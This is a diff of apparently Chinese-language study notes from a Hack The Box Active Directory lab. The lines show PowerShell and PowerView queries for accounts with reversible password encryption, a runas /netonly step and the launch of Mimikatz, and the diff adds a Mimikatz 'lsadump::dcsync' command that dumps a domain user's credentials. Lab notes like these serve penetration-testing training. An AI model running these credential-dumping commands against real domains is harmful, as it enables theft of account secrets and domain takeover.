@@ -47,7 +47,8 @@ C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccoun
 C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol      也可以用Powerview
 C:\htb> .\runas /netonly /user:INLANEFREIGHT\adunn powershell            也可以用 Mimikatz
 C:\htb> .\mimikatz.exe
-使用 Mimikatz
+lsadump::dcsync /user:INLANEFREIGHT\<syncron>
+如使用 Mimikatz
 必须针对一个特定的用户，比如内置管理员账户
 必须在拥有 DCSync 权限的用户的上下文中运行
 
